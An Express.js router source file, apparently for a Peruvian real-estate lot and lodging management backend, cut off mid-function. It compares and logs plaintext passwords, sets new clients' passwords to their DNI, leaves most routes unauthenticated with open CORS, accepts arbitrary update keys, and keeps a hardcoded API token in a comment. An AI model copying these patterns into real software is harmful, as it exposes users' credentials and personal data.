import { Router } from 'express';
import jwt from 'jsonwebtoken'
import dotenv from 'dotenv';
import express from 'express';
import cors from 'cors';
import { UsersModel } from '../models/users.js';
import verifyToken from '../utils/validateToken.js';
import { PropiedadesModel } from '../models/propiedades.js';
// import { redis } from '../db/dbRedis.js';
import axios from 'axios';
import serndEmail from '../utils/serndEmail.js';
import { PagosModel } from '../models/pagos.js';
import moment from "moment-timezone";
import serndEmailReservaSinCorreo from '../utils/serndEmailReservaSinCorreo.js';
import { StatusLotes } from '../utils/StatusLote.js';
import mongoose from 'mongoose';
import Habitacion from '../models/habitaciones.js';
import { handleRegistroContrato } from '../handlers/handleRegistroContrato.js';
import { handleGetContratos } from '../handlers/handleGetContratos.js';
import { handleRetirarContrato } from '../handlers/handleRetirarContrato.js';
import { handleRegistroHabitacion } from '../handlers/handleRegistroHabitacion.js';
import { handleEstadoHabitacion } from '../handlers/handleEstadoHabitacion.js';
import { handleHabitacionUnica } from '../handlers/handleHabitacionUnica.js';
import { handleContratoUnico } from '../handlers/handleContratoUnico.js';
import { handleEditarContrato } from '../handlers/handleEditarContrato.js';
import { handleEditarContratoClientes } from '../handlers/handleEditarContratoClientes.js';
import { handleEditarConsumoAlojamiento } from '../handlers/handleEditarConsumoAlojamiento.js';
import { handleEditarConsumosVarios } from '../handlers/handleEditarConsumosVarios.js';
import { handleEditarIngresosEgresosCaja } from '../handlers/handleEditarIngresosEgresosCaja.js';
import { handleNumeroBoletaFactura } from '../handlers/handleNumeroBoletaFactura.js';
import { handleEditarIngresosEgresosCajaGeneral } from '../handlers/handleEditarIngresosEgresosCajaGeneral.js';
import { handleGetContratosPlanilla } from '../handlers/handleGetContratosPlanilla.js';
import { handleIngresosEgresosCajaReal } from '../handlers/handleIngresosEgresosCajaReal.js';
import { handleGetCaja } from '../handlers/handleGetCaja.js';
import { handleRegistroUsuario } from '../handlers/handleRegistroUsuario.js';
import { handleRegistrarCliente } from '../handlers/handleRegistrarCliente.js';
import { handleGetContratosRetirados } from '../handlers/handleGetContratosRetirados.js';
import { handleEditarContratoReserva } from '../handlers/handleEditarContratoReserva.js';
import { handleGetContratosClientes } from '../handlers/handleGetContratosClientes.js';
import { handleGetOtrosIngresosEgresos } from '../handlers/handleGetOtrosIngresosEgresos.js';
import { handleNuevaVentaBazar } from '../handlers/handleNuevaVentaBazar.js';
import { handleGetVentasBazarContratoUnique } from '../handlers/handleGetVentasBazarContratoUnique.js';
import { handleRegistroVentasBazarContrato } from '../handlers/handleRegistroVentasBazarContrato.js';
import { handleGetVentasLavanderiaContratoUnique } from '../handlers/handleGetVentasLavanderiaContratoUnique.js';
import { handleNuevaVentaLavanderia } from '../handlers/handleNuevaVentaLavanderia.js';
import { handleRegistroVentasLavanderiaContrato } from '../handlers/handleRegistroVentasLavanderiaContrato.js';
import { handleGetVentasExtraIgvContratoUnique } from '../handlers/handleGetVentasExtraIgvContratoUnique.js';
import { handleNuevaVentaExtraIgv } from '../handlers/handleNuevaVentaExtraIgv.js';
import { handleRegistroVentasExtraIgvContrato } from '../handlers/handleRegistroVentasExtraIgvContrato.js';
import { handleGetVentasVueltoContratoUnique } from '../handlers/handleGetVentasVueltoContratoUnique.js';
import { handleRegistroVentasVueltoContrato } from '../handlers/handleRegistroVentasVueltoContrato.js';
import { handleNuevaVentaVuelto } from '../handlers/handleNuevaVentaVuelto.js';
import { handleGetVentasAlojamientoContratoUnique } from '../handlers/handleGetVentasAlojamientoContratoUnique.js';
import { handleNuevaVentaAlojamiento } from '../handlers/handleNuevaVentaAlojamiento.js';
import { handleRegistroVentasAlojamientoContrato } from '../handlers/handleRegistroVentasAlojamientoContrato.js';
import { handleNuevaVentaExterna } from '../handlers/handleNuevaVentaExterna.js';
import { handleGetCuadreCajaPorFecha } from '../handlers/handleGetCuadreCajaPorFecha.js';
import { handleGetVentasBazarPorFecha } from '../handlers/handleGetVentasBazarPorFecha.js';
import { handleRegistroProductoBazar } from '../handlers/handleRegistroProductoBazar.js';
import { handleGetProcutosBazarTotales } from '../handlers/handleGetProcutosBazarTotales.js';
import { handleEditarProductoInventario } from '../handlers/handleEditarProductoInventario.js';
import { handleEditarStockProductoBazar } from '../handlers/handleEditarStockProductoBazar.js';
import { handleGetProductosBazarUnits } from '../handlers/handleGetProductosBazarUnits.js';
import { handleContratoComentario } from '../handlers/handleContratoComentario.js';
import { handleGetVentasAlojamientoContratoAll } from '../handlers/handleGetVentasAlojamientoContratoAll.js';
import { handleRegistroPedido } from '../handlers/handleRegistroPedido.js';
import { handleGetPedidos } from '../handlers/handleGetPedidos.js';
import { handlePedidosSemana } from '../handlers/handlePedidosSemana.js';
import { handleChangeStatusPedido } from '../handlers/handleChangeStatusPedido.js';
import { handleStock } from '../handlers/handleStock.js';
import { handleChangeStatusFechaEntregaPedido } from '../handlers/handleChangeStatusFechaEntregaPedido.js';
import { handleGetPedido } from '../handlers/handleGetPedido.js';
import { handleEditarPedido } from '../handlers/handleEditarPedido.js';
import { handleGetAllUsuarios } from '../handlers/handleGetAllUsuarios.js';
import { handleGetUserById } from '../handlers/handleGetUserById.js';
import { handleEditarUsuarioId } from '../handlers/handleEditarUsuarioId.js';
import { handleGetConfig } from '../handlers/handleGetConfig.js';
import { handlePacthConfig } from '../handlers/handlePacthConfig.js';
import { handleSubirVoucher } from '../handlers/handleSubirVoucher.js';
import { handleGetVouchersAll } from '../handlers/handleGetVouchersAll.js';
import { handleEditVouchers } from '../handlers/handleEditVouchers.js';
import { handleGetVouchersAllFull } from '../handlers/handleGetVouchersAllFull.js';
import { handleInsertUrlsPagos } from '../handlers/handleInsertUrlsPagos.js';
import { handleIsCobrarUtilidad } from '../handlesrsUtilidades/handleIsCobrarUtilidad.js';
import { handleUtilidadTrimestral } from '../handlesrsUtilidades/handleUtilidadTrimestral.js';
import { handlePatchDatosCuentaBancaria } from '../handlesrsUtilidades/handlePatchDatosCuentaBancaria.js';
import { handleGetUserIdById } from '../handlesrsUtilidades/handleGetUserIdById.js';
import { handlePatchZeroUtilidades } from '../handlesrsUtilidades/handlePatchZeroUtilidades.js';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const app = express();

dotenv.config();

// console.log("prd?", process.env.NODE_ENV)
// app.use(cors({
//     origin: [
//         "https://inmobackend.site",
//         "http://localhost:3000",
//         "http://localhost:3001",
//         "http://localhost:3002",
//         "http://localhost:3003",
//         "https://parquesdeparacas.inmobackend.site",
//         "https://mirafloresdelnorte1.inmobackend.site",
//         "https://mirafloresdelnorte2.inmobackend.site",
//         "https://portalesdeparaiso.inmobackend.site",
//         "https://vallehermosocanete.inmobackend.site",
//     ], // Permite solo solicitudes desde tu frontend
//     methods: ["GET", "POST", "PATCH", "PUT", "DELETE"], // Métodos HTTP permitidos
//     allowedHeaders: ["Content-Type", "Authorization"], // Encabezados permitidos
//     credentials: true // Permitir cookies o credenciales
// }));
app.use(cors());

app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));
app.use(express.text({ limit: '200mb' }));

const router = Router();

// Función para validar el DNI
const validateDni = (dni) => {
    // Comprobar que el DNI tiene exactamente 8 caracteres
    if (dni.length !== 8) {
        return "El DNI debe tener exactamente 8 caracteres.";
    }

    // Comprobar que no haya 8 dígitos repetidos
    const isAllRepeated = /^(\d)\1{7}$/.test(dni);
    if (isAllRepeated) {
        return "El DNI no puede tener 8 dígitos repetidos.";
    }

    // Comprobar secuencias ascendentes o descendentes
    const isAscending = "12345678".includes(dni);
    const isDescending = "87654321".includes(dni);
    const isDescending2 = "876".includes(dni);
    const isDescending3 = "321".includes(dni);
    const isDescending4 = "123".includes(dni);
    if (isAscending || isDescending || isDescending2 || isDescending3 || isDescending4) {
        return "El DNI no puede ser una secuencia ascendente o descendente.";
    }

    // 5. No puede tener 3 o más dígitos consecutivos ascendentes o descendentes
    for (let i = 0; i <= dni.length - 4; i++) {
        const a = parseInt(dni[i]);
        const b = parseInt(dni[i + 1]);
        const c = parseInt(dni[i + 2]);

        const isAscending = b === a + 1 && c === b + 1;
        const isDescending = b === a - 1 && c === b - 1;

        if (isAscending || isDescending) {
            return "El DNI no puede ser una secuencia ascendente o descendente.";
        }
    }

    // Comprobar si hay más de 4 dígitos repetidos
    const digitCount = {};
    for (const digit of dni) {
        digitCount[digit] = (digitCount[digit] || 0) + 1;
    }
    const hasMoreThan4Repeated = Object.values(digitCount).some(count => count >= 4);
    if (hasMoreThan4Repeated) {
        return "El DNI no puede tener más de 4 dígitos repetidos.";
    }

    // Validación exitosa
    return null;
};

router.post('/login', async (req, res) => {
    try {
        const body = await req.body;

        // console.log("body de register usuario: ", body)

        const { documentoUsuario, password } = body;
        console.log("documentoUsuario: ", documentoUsuario)
        console.log("password: ", password)

        const user = await UsersModel.findOne({ documentoUsuario: documentoUsuario, statusActive: { $in: ["1", "2"] } }).lean().exec();
        if (!user) return res.status(406).json({
            message: 'Error en la autenticación',
            messageLarge: 'Lo sentimos, su usuario no existe o no esta activo, verifique y vuleva a intentarlo',
            data: null, // Datos del usuario decodificados del token
            status: 406,
        });

        // const validPassword = await bcrypt.compare(password, user.password);
        // if (!validPassword) return res.json({
        //     error: 'contraseña no válida',
        //     status: 401
        // })
        if (password !== user.password) return res.status(406).json({
            message: 'Clave incorrecta',
            messageLarge: 'Lo sentimos, su clave es incorrecta, verifique y vuleva a intentarlo',
            data: null, // Datos del usuario decodificados del token
            status: 406,
        });

        // if (user.role !== "admin") return res.status(406).json({
        //     message: 'Usuario no Autorizado',
        //     messageLarge: 'Lo sentimos, no tiene permisos para acceder, comuniquese con el administrador',
        //     data: null, // Datos del usuario decodificados del token
        //     status: 406,
        // });

        const data = {
            ...user,
            historico: "",
            password: "secret"
        }

        console.log("data: ", data)

        const token = jwt.sign(
            { user: data }, // Solo datos relevantes
            process.env.TOKEN_SECRET,
            { expiresIn: '24h' }
        );

        return res.status(201).json({
            error: null,
            data: 'exito bienvenido',
            token: token,
            status: 201,
        });
    } catch (error) {
        console.log(error);
        return res.status(500).json({ message: `"Error desconocido" ${error}` });
    }
});

router.post("/registroClientes", handleRegistrarCliente);

router.post("/registerInvitado", async (req, res) => {
    try {
        const body = await req.body;

        const {
            documentoUsuario,
            nombres,
            apellidoPaterno,
            apellidoMaterno,
            email,
            celular,
            direccion,
            fechaInvitacionProyecto,
            voucherBase64,
            payType,
            amount,
            proyecto,
            emailAsesorInicial,
            usuarioAcount,
            numeroDocumentoPatrocinador,
            nombresPatrocinador,
            apellidoPaternoPatrocinador,
            apellidoMaternoPatrocinador,
        } = body;
        console.log("body de register usuario: ", body)

        const user = await UsersModel.findOne({ documentoUsuario: documentoUsuario, role: "user asesor" }).lean().exec();
        // if (user) return res.status(406).json({
        //     message: 'Usuario ya existe',
        //     messageLarge: 'Lo sentimos, su usuario no existe, verifique y vuleva a intentarlo',
        //     data: null, // Datos del usuario decodificados del token
        //     status: 406,
        // });

        // const validPassword = await bcrypt.compare(password, user.password);
        // if (!validPassword) return res.json({
        //     error: 'contraseña no válida',
        //     status: 401
        // })

        const invitedNew = {
            role: "user invited",
            userType: "invited",
            statusActive: "0",
            //datos personales
            nombres: nombres,
            apellidoPaterno: apellidoPaterno,
            apellidoMaterno: apellidoMaterno,
            documentoUsuario: documentoUsuario,
            fechaNacimiento: "",
            fechaInvitacionProyecto: fechaInvitacionProyecto,
            direccion: direccion,
            email: email,
            celular: celular,
            estadoCivil: "",
            ocupacion: "",
            numeroDocumentoPatrocinador: numeroDocumentoPatrocinador,
            nombresPatrocinador: nombresPatrocinador,
            apellidoPaternoPatrocinador: apellidoPaternoPatrocinador,
            apellidoMaternoPatrocinador: apellidoMaternoPatrocinador,
        }

        const userNew = await UsersModel.create(invitedNew);

        console.log("userNew: ", userNew)

        const nOperacion = new Date().getTime();

        const nuevoPago = {
            codLote: "Voucher Invitado",
            nOperacion: nOperacion,
            documentoUsuario: documentoUsuario,
            fechaPago: moment().tz("America/Lima").format("YYYY-MM-DDTHH:mm:ss.SSSZ"),
            fechaVerificacion: "",
            estadoVerificacion: "0",
            status: "1", // "0" eliminado, "1" vigente
            conceptoPago: "Voucher Invitado",
            formaPago: payType,
            monto: amount,
            proyecto: proyecto,
        };
        const newPay = await PagosModel.create(nuevoPago);

        const base64Content = (voucherBase64.split(",")[1] !== undefined && voucherBase64.split(",")[1] !== null) ? voucherBase64.split(",")[1] : archivo; // Obtiene la parte base64 pura

        const typeFileVoucher = "png"; // Tipo de archivo

        const info = await serndEmail(base64Content, documentoUsuario, email, nombres, typeFileVoucher, "Voucher Invitado", proyecto, payType, "Voucher Invitado", amount, nOperacion, moment().tz("America/Lima").format("YYYY-MM-DDTHH:mm:ss.SSSZ"), usuarioAcount, emailAsesorInicial);

        console.log(info)

        return res.status(201).json({
            error: null,
            data: userNew,
            status: 201,
        });
    } catch (error) {
        console.log(error);
        return res.status(500).json({ message: `"Error desconocido" ${error}` });
    }
});

router.get("/dashboard", verifyToken, async (req, res) => {
    try {
        console.log("entre a dashboard")

        return res.status(201).json({
            message: 'Estos son los datos del usuario con token okay',
            data: "user", // Datos del usuario decodificados del token
            status: 201,
        });
    } catch (error) {
        console.log("error");
        return res.status(500).json({ message: `"Error desconocido" ${error}` });
    }
});

router.get("/getAllHabitaciones", async (req, res) => {
    try {
        const params = req.query;
        const proyecto = params?.params?.proyecto;

        console.log("params: ", proyecto)

        if (!proyecto) {
            return res.status(400).json({ message: "El parámetro 'proyecto' es obligatorio" });
        }

        // 2️⃣ Si no está en Redis, buscar en la base de datos
        // console.log("🔍 Buscando en la base de datos...");
        const propiedades = await Habitacion.find({ proyecto }, { historialContratos: 0 }).exec();

        if (!propiedades || propiedades.length === 0) {
            return res.status(202).json({
                message: "No se encontraron propiedades",
                data: [],
                status: 202,
            });
        }

        return res.status(200).json({
            message: "Propiedades obtenidas desde la base de datos",
            data: propiedades,
            status: 200,
        });
    } catch (error) {
        console.error("❌ Error en getAllPropiedades:", error);
        return res.status(500).json({ message: `Error desconocido: ${error.message}` });
    }
});

router.post("/reniec", async (req, res) => {
    try {
        const body = await req.body;

        const { dni } = body;

        console.log("body de postCorreo: ", body)

        const responseReniec = await axios.post(
            'https://apiperu.dev/api/dni',
            { dni }, // Cuerpo de la solicitud
            {
                headers: {
                    Accept: 'application/json',
                    'Content-Type': 'application/json',
                    Authorization: `Bearer ${process.env.API_RENIEC_APISPERU}`, // Reemplaza con tu token
                },
            }
        );
        // const responseReniec = await axios.get(`https://dniruc.apisperu.com/api/v1/dni/${dni}?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6ImRpZWdvZXNwaW5vemFyZXluYUBnbWFpbC5jb20ifQ.-P0WobUjTcbUbsfvw31Zgh8N78vQBC2sVT9G6zcZWCA`);

        console.log('Datos del DNI:', responseReniec.data);

        return res.status(201).json({
            message: 'Estos son los datos del DNI',
            data: responseReniec.data, // Datos del usuario decodificados del token
            status: 201,
        });
    } catch (error) {
        console.log("error");
        return res.status(500).json({ message: "Error" });
    }
});

router.post("/reservarVender", async (req, res) => {
    try {
        const body = await req.body;

        const {
            //lote
            codLote,
            status,
            nOperacion,
            fechaOperacion,
            metros,
            referencia,
            precioSoles,
            expirationTime,
            nroVoucherPasarela,
            //cliente
            documentoCliente,
            nombresCliente,
            apellidoPaternoCliente,
            apellidoMaternoCliente,
            emailCliente,
            celularCliente,
            ocupacionCliente,
            //sunat
            tipoComprobanteCliente,
            rucCliente,
            razonSocialCliente,
            estadoCivilCliente,
            //conyugue
            numeroDocumentoClienteConyugue,
            nombresClienteConyugue,
            apellidoClientePaternoConyugue,
            apellidoClienteMaternoConyugue,
            //asesor
            documentoAsesor,
            nombresAsesor,
            apellidoPaternoAsesor,
            apellidoMaternoAsesor,
            emailAsesor,
            celularAsesor,
            patrocinadorAsesor,
            proyecto,
            observaciones,
            usuarioAcount,
            emailAsesorInicial,
            acction,
        } = body;
        console.log("body de reserrvaVenta: ", body)

        // Validar el DNI (documentoUsuario)
        const dniError = validateDni(documentoCliente);
        if (dniError && acction !== "editar") {
            return res.status(202).json({
                message: dniError,
                data: dniError,
                // data: [loteChange],
                status: 202,
            });
        }
        else {
            const propiedadUniq = await PropiedadesModel.findOne({ codLote: codLote }).exec();
            // console.log("propiedadUniq: ", propiedadUniq)

            const newAccount = {
                documentoCliente: documentoCliente,
                documentoAsesor: documentoAsesor,
                status: status,
                observaciones: observaciones,
                fechaOperacion: fechaOperacion,
                nOperacion: nOperacion,
                usuarioRegistro: usuarioAcount,
            }

            // console.log("newAccount: ", newAccount)

            // const result = await UsersModel.updateMany({}, { $unset: { historico: "" } });
            // console.log("Registros actualizados:", result);

            const reservaVentaHistorico = await PropiedadesModel.findOneAndUpdate(
                { codLote: codLote },
                { $push: { historico: newAccount } },
                { new: true } // Opción para devolver el documento actualizado
            );

            console.log("reservaVentaHistorico: ", reservaVentaHistorico)

            const reservaVenta = await PropiedadesModel.findOneAndUpdate(
                { codLote: codLote, proyecto: proyecto }, // Criterio de búsqueda
                {
                    $set: {
                        //lote
                        status: status,
                        nOperacion,
                        fechaOperacion,
                        metros,
                        referencia,
                        precioSoles,
                        expirationTime,
                        nroVoucherPasarela,
                        //cliente
                        documentoCliente,
                        nombresCliente,
                        apellidoPaternoCliente,
                        apellidoMaternoCliente,
                        emailCliente,
                        celularCliente,
                        ocupacionCliente,
                        estadoCivilCliente,
                        //sunat
                        tipoComprobanteCliente,
                        rucCliente,
                        razonSocialCliente,
                        //conyugue
                        numeroDocumentoClienteConyugue,
                        nombresClienteConyugue,
                        apellidoClientePaternoConyugue,
                        apellidoClienteMaternoConyugue,
                        //asesor
                        documentoAsesor,
                        nombresAsesor,
                        apellidoPaternoAsesor,
                        apellidoMaternoAsesor,
                        emailAsesor,
                        celularAsesor,
                        patrocinadorAsesor,
                        observaciones,
                        usuarioRegistro: usuarioAcount,
                        historico: reservaVentaHistorico.historico,
                    }
                },
                { new: true } // Opción para devolver el documento actualizado
            );

            console.log("reservaVenta: ", reservaVenta)

            // // Actualizar la propiedad en Redis
            // const redisKey1 = `propiedadesAllHash:${proyecto}`;
            // redis.hset(redisKey1, codLote, JSON.stringify(reservaVenta), (err, reply) => {
            //     if (err) {
            //         console.error("Error al actualizar Redis propiedad:", err);
            //     } else {
            //         console.log("Propiedad actualizada en Redis:", reply);
            //     }
            // });

            const user = await UsersModel.findOne({ documentoUsuario: documentoCliente }).exec();
            // console.log("user: ", user)

            if (!user) {
                const nuevoCliente = {
                    role: "user client",
                    userType: "client",
                    password: documentoCliente,
                    statusActive: "0",
                    //patrocinador
                    numeroDocumentoPatrocinador: "",
                    nombresPatrocinador: "",
                    apellidoPaternoPatrocinador: "",
                    apellidoMaternoPatrocinador: "",
                    //datos personales
                    nombres: nombresCliente,
                    apellidoPaterno: apellidoPaternoCliente,
                    apellidoMaterno: apellidoMaternoCliente,
                    documentoUsuario: documentoCliente,
                    fechaNacimiento: "",
                    direccion: "",
                    email: emailCliente,
                    celular: celularCliente,
                    estadoCivil: estadoCivilCliente,
                    ocupacion: ocupacionCliente,
                    //datos sunat
                    tipoComprobante: tipoComprobanteCliente,
                    ruc: rucCliente,
                    razonSocial: razonSocialCliente,
                    // conyugue
                    nombresConyugue: nombresClienteConyugue,
                    apellidoPaternoConyugue: apellidoClientePaternoConyugue,
                    apellidoMaternoConyugue: apellidoClienteMaternoConyugue,
                    fechaNacimientoConyugue: "",
                    numeroDocumentoConyugue: numeroDocumentoClienteConyugue,
                };
                const newClient = await UsersModel.create(nuevoCliente);

                // // Actualizar el nuevo cliente en Redis
                // const redisKey2 = `usuariosAllHash:${proyecto}`;
                // redis.hset(redisKey2, documentoCliente, JSON.stringify(newClient), (err, reply) => {
                //     if (err) {
                //         console.error("Error al actualizar Redis usuario:", err);
                //     } else {
                //         console.log("Usuario actualizado en Redis:", reply);
                //     }
                // });
            }

            const newUserHistorico = {
                role: "user client",
                userType: "client",
                codLote: codLote,
                status: status,
                accion: "",
                observaciones: observaciones,
                fecha: fechaOperacion,
                nOperacion: nOperacion,
            }

            // console.log("newUserHistorico: ", newUserHistorico)

            const newClientHistorico = await UsersModel.findOneAndUpdate(
                { documentoUsuario: documentoCliente },
                { $push: { historico: newUserHistorico } },
                { new: true } // Opción para devolver el documento actualizado
            );

            // console.log("reservaVentaHistorico: ", newClientHistorico)

            // // Actualizar el historico del cliente en Redis
            // const redisKey2 = `usuariosAllHash:${proyecto}`;
            // redis.hset(redisKey2, documentoCliente, JSON.stringify(newClientHistorico), (err, reply) => {
            //     if (err) {
            //         console.error("Error al actualizar Redis usuario:", err);
            //     } else {
            //         console.log("Usuario actualizado en Redis:", reply);
            //     }
            // });

            const userAsesor = await UsersModel.findOne({ documentoUsuario: documentoAsesor }).exec();
            // console.log("userAsesor: ", userAsesor)

            let newAsesorHistorico = null;

            if (userAsesor) {
                const newUserAsesorHistorico = {
                    role: "user asesor",
                    userType: "asesor",
                    codLote: codLote,
                    status: status,
                    accion: "",
                    observaciones: observaciones,
                    fecha: fechaOperacion,
                    nOperacion: nOperacion,
                }

                // console.log("newUserAsesorHistorico: ", newUserAsesorHistorico)

                newAsesorHistorico = await UsersModel.findOneAndUpdate(
                    { documentoUsuario: documentoAsesor },
                    { $push: { historico: newUserAsesorHistorico } },
                    { new: true } // Opción para devolver el documento actualizado
                );

                // // Actualizar el historico del asesor en Redis
                // redis.hset(redisKey2, documentoAsesor, JSON.stringify(newAsesorHistorico), (err, reply) => {
                //     if (err) {
                //         console.error("Error al actualizar Redis asesor:", err);
                //     } else {
                //         console.log("Asesor actualizado en Redis:", reply);
                //     }
                // });
            }

            if (status === "Disponible") {
                // Actualizar los pagos en MongoDB
                const updatedPagos = await PagosModel.updateMany(
                    { codLote: codLote },
                    { $set: { status: "0" } }
                );

                // console.log("Pagos actualizados en MongoDB:", updatedPagos);
            }

            if (status !== "Disponible") {
                const info22 = await serndEmailReservaSinCorreo("base64Content", documentoCliente, emailCliente, nombresCliente, "typeFileVoucher", codLote, proyecto, "payType", "fileType", "amount", nOperacion, fechaOperacion, usuarioAcount, emailAsesorInicial, status, metros, precioSoles);

                // console.log("aqui llegue1", info22)
            }

            return res.status(200).json({
                message: 'Estos son los datos de la reservaVenta',
                data: [reservaVenta, newClientHistorico],
                // data: [loteChange],
                status: 200,
            });
        }

    } catch (error) {
        console.log("error");
        return res.status(500).json({ message: error });
    }
});

router.post("/fechasEntrega", async (req, res) => {
    try {
        const body = await req.body;

        const {
            key,
            value,
            codLote,
        } = body;
        console.log("body de reserrvaVenta: ", body)

        const updatedFechasEntrega = await PropiedadesModel.updateMany(
            { codLote: codLote },
            { $set: { [key]: value } }, // ✅ Agrega la propiedad si no existe
            { upsert: true } // ✅ Crea el documento si no existe
        );

        return res.status(200).json({
            message: 'Estos son los datos de la reservaVenta',
            data: updatedFechasEntrega,
            // data: [loteChange],
            status: 200,
        });
    } catch (error) {
        console.log("error");
        return res.status(500).json({ message: error });
    }
});

router.get("/timeReservas", async (req, res) => {
    try {

        const params = req.query;
        const proyecto = params?.params?.proyecto;

        const propiedades = await PropiedadesModel.find({ status: StatusLotes.STATUS_RESERVADO, proyecto }).exec();
        let arr = [];
        const resultMasivo = await Promise.all(propiedades?.map(async (item, index) => {
            if (new Date() > new Date(item.expirationTime)) {
                console.log("item: ", item)
                const updatedPropiedad = await PropiedadesModel.findOneAndUpdate(
                    { codLote: item.codLote },
                    {
                        status: StatusLotes.STATUS_DISPONIBLE,
                        fechaOperacion: "",
                        nOperacion: moment().tz("America/Lima").valueOf(),
                        documentoCliente: "",
                        nombresCliente: "",
                        apellidoPaternoCliente: "",
                        apellidoMaternoCliente: "",
                        emailCliente: "",
                        celularCliente: "",
                        estadoCivilCliente: "",
                        ocupacionCliente: "",
                        nombresClienteConyugue: "",
                        apellidoClientePaternoConyugue: "",
                        apellidoClienteMaternoConyugue: "",
                        fechaNacimientoClienteConyugue: "",
                        numeroDocumentoClienteConyugue: "",
                        tipoComprobanteCliente: "",
                        rucCliente: "",
                        razonSocialCliente: "",
                        documentoAsesor: "",
                        nombresAsesor: "",
                        apellidoPaternoAsesor: "",
                        apellidoMaternoAsesor: "",
                        emailAsesor: "",
                        celularAsesor: "",
                        patrocinadorAsesor: "",
                        fechaEntregaPlanoMemoria: "",
                        fechaEntregaMinuta: "",
                        fechaEntregaEscrituraPublica: "",
                        fechaEntregaInspeccionMunicipal: "",
                        nKardex: "",
                        observacionesSeguimiento: "",
                        fechaPagoComision: "",
                        subidoComision: "",
                    },
                    { new: true } // Devuelve el documento actualizado
                );
                arr.push(updatedPropiedad)

                const deletedPagos = await PagosModel.updateMany(
                    { codLote: item.codLote },
                    { $set: { status: "0" } }
                );
                arr.push(deletedPagos)

                console.log("item: ", item.expirationTime)
            }
        }))

        return res.status(200).json({
            message: "ok",
            data: arr,
            status: 200,
        });

    }
    catch (error) {
        console.log("error");
        return res.status(500).json({ message: error });
    }
})

router.post("/reservarVenderMasivo", async (req, res) => {
    try {
        const body = await req.body;

        const {
            //lote
            codLotes,
            status,
            nOperacion,
            fechaOperacion,
            // metros,
            // referencia,
            precioSoles,
            expirationTime,
            //cliente
            documentoCliente,
            nombresCliente,
            apellidoPaternoCliente,
            apellidoMaternoCliente,
            emailCliente,
            celularCliente,
            ocupacionCliente,
            //sunat
            tipoComprobanteCliente,
            rucCliente,
            razonSocialCliente,
            estadoCivilCliente,
            //conyugue
            numeroDocumentoClienteConyugue,
            nombresClienteConyugue,
            apellidoClientePaternoConyugue,
            apellidoClienteMaternoConyugue,
            //asesor
            documentoAsesor,
            nombresAsesor,
            apellidoPaternoAsesor,
            apellidoMaternoAsesor,
            emailAsesor,
            celularAsesor,
            patrocinadorAsesor,
            proyecto,
            observaciones,
        } = body;
        console.log("body de reserrvaVenta: ", body)
        let arr = []
        const resultMasivo = await Promise.all(codLotes?.map(async (codLote) => {
            const propiedadUniq = await PropiedadesModel.findOne({ codLote: codLote, proyecto: proyecto }).exec();
            // console.log("propiedadUniq: ", propiedadUniq)

            const newAccount = {
                documentoCliente: documentoCliente,
                documentoAsesor: documentoAsesor,
                status: status,
                observaciones: observaciones,
                fechaOperacion: fechaOperacion,
                nOperacion: nOperacion,
            }

            // console.log("newAccount: ", newAccount)

            // const result = await UsersModel.updateMany({}, { $unset: { historico: "" } });
            // console.log("Registros actualizados:", result);

            const reservaVentaHistorico = await PropiedadesModel.findOneAndUpdate(
                { codLote: codLote, proyecto: proyecto },
                { $push: { historico: newAccount } },
                { new: true } // Opción para devolver el documento actualizado
            );

            // console.log("reservaVentaHistorico: ", reservaVentaHistorico)

            const reservaVenta = await PropiedadesModel.findOneAndUpdate(
                { codLote: codLote, proyecto: proyecto }, // Criterio de búsqueda
                {
                    $set: {
                        //lote
                        status: status == "" ? propiedadUniq.status : status,
                        nOperacion,
                        fechaOperacion,
                        // metros,
                        // referencia,
                        precioSoles: precioSoles !== "" ? precioSoles : propiedadUniq.precioSoles,
                        expirationTime,
                        //cliente
                        documentoCliente,
                        nombresCliente,
                        apellidoPaternoCliente,
                        apellidoMaternoCliente,
                        emailCliente,
                        celularCliente,
                        ocupacionCliente,
                        estadoCivilCliente,
                        //sunat
                        tipoComprobanteCliente,
                        rucCliente,
                        razonSocialCliente,
                        //conyugue
                        numeroDocumentoClienteConyugue,
                        nombresClienteConyugue,
                        apellidoClientePaternoConyugue,
                        apellidoClienteMaternoConyugue,
                        //asesor
                        documentoAsesor,
                        nombresAsesor,
                        apellidoPaternoAsesor,
                        apellidoMaternoAsesor,
                        emailAsesor,
                        celularAsesor,
                        patrocinadorAsesor,
                        observaciones,
                    }
                },
                { new: true } // Opción para devolver el documento actualizado
            );

            // console.log("reservaVenta: ", reservaVenta)

            // // Actualizar la propiedad en Redis
            // const redisKey1 = `propiedadesAllHash:${proyecto}`;
            // redis.hset(redisKey1, codLote, JSON.stringify(reservaVenta), (err, reply) => {
            //     if (err) {
            //         console.error("Error al actualizar Redis propiedad:", err);
            //     } else {
            //         console.log("Propiedad actualizada en Redis:", reply);
            //     }
            // });


            if (documentoCliente !== null && documentoCliente !== undefined && documentoCliente !== "") {

                const user = await UsersModel.findOne({ documentoUsuario: documentoCliente }).exec();
                console.log("user: ", user)
                const nuevoCliente = {
                    role: "user client",
                    userType: "client",
                    password: documentoCliente,
                    statusActive: "0",
                    //patrocinador
                    numeroDocumentoPatrocinador: "",
                    nombresPatrocinador: "",
                    apellidoPaternoPatrocinador: "",
                    apellidoMaternoPatrocinador: "",
                    //datos personales
                    nombres: nombresCliente,
                    apellidoPaterno: apellidoPaternoCliente,
                    apellidoMaterno: apellidoMaternoCliente,
                    documentoUsuario: documentoCliente,
                    fechaNacimiento: "",
                    direccion: "",
                    email: emailCliente,
                    celular: celularCliente,
                    estadoCivil: estadoCivilCliente,
                    ocupacion: ocupacionCliente,
                    //datos sunat
                    tipoComprobante: tipoComprobanteCliente,
                    ruc: rucCliente,
                    razonSocial: razonSocialCliente,
                    // conyugue
                    nombresConyugue: nombresClienteConyugue,
                    apellidoPaternoConyugue: apellidoClientePaternoConyugue,
                    apellidoMaternoConyugue: apellidoClienteMaternoConyugue,
                    fechaNacimientoConyugue: "",
                    numeroDocumentoConyugue: numeroDocumentoClienteConyugue,
                };
                const newClient = await UsersModel.create(nuevoCliente);

                // // Actualizar el nuevo cliente en Redis
                // const redisKey2 = `usuariosAllHash:${proyecto}`;
                // redis.hset(redisKey2, documentoCliente, JSON.stringify(newClient), (err, reply) => {
                //     if (err) {
                //         console.error("Error al actualizar Redis usuario:", err);
                //     } else {
                //         console.log("Usuario actualizado en Redis:", reply);
                //     }
                // });
            }


